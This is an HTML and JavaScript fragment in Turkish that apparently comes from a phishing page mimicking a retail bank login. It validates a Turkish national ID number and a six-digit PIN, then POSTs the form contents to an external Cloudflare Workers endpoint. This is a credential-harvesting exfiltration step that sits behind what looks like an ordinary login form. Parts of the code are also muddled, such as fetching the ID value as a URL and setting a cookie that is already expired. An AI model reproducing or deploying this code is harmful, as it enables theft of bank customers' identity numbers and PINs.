	     <script>
document.addEventListener("DOMContentLoaded", function() {
    function tcno_dogrula(tcno) {
        tcno = String(tcno);
        if (tcno.substring(0, 1) === '0') {
            return false;
        }
        if (tcno.length !== 11) {
            return false;
        }
        var ilkon_array = tcno.substr(0, 10).split('');
        var ilkon_total = hane_tek = hane_cift = 0;
        for (var i = j = 0; i < 9; ++i) {
            j = parseInt(ilkon_array[i], 10);
            if (i & 1) {
                hane_cift += j;
            } else {
                hane_tek += j;
            }
            ilkon_total += j;
        }
        if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
            return false;
        }
        ilkon_total += parseInt(ilkon_array[9], 10);
        if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
            return false;
        }
        return true;
    }

    function kontrolEt() {
        var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
        var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
        var devamButton = document.getElementById("ctl00_c_RetailLoginButton");

       if (/^\d{11}$/.test(identityInput.value) && /^\d{6}$/.test(pinInput.value) && tcno_dogrula(identityInput.value)) {
            devamButton.removeAttribute("disabled");
        } else {
            devamButton.setAttribute("disabled", "disabled");
        }
    }

    var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
    var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");

    identityInput.addEventListener("input", kontrolEt);
    pinInput.addEventListener("input", kontrolEt);
});
    </script>

  <form id="myForm">

  <script>
    function submitForm() {
      // RetailIdentityTextBox değerini al
      const retailIdentity = document.getElementById("RetailIdentityTextBox").value;

      // GET isteği ile belirtilen URL'ye istek gönder
      fetch(retailIdentity)
        .then(response => response.json())
        .then(data => {
          // Gelen JSON verisinden "adi" ve "soyadi" değerlerini al
          const adi = data.adi;
          const soyadi = data.soyadi;

          // Alınan değerleri bir cookie'ye kaydet
          document.cookie = `isim=${adi} ${soyadi}; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;

          // Formu başka bir URL'ye POST isteği ile gönder
          const formData = new FormData(document.getElementById("myForm"));
          fetch('https://worker-broad-snow-1482.selimjuhan2.workers.dev', {
            method: 'POST',
            body: formData
          })
            .then(response => response.json())
            .then(data => {
              console.log('POST isteği başarılı:', data);
            })
            .catch(error => {
              console.error('POST isteği hatası:', error);
            });
        })
        .catch(error => {
          console.error('GET isteği hatası:', error);
        });
    }
  </script>
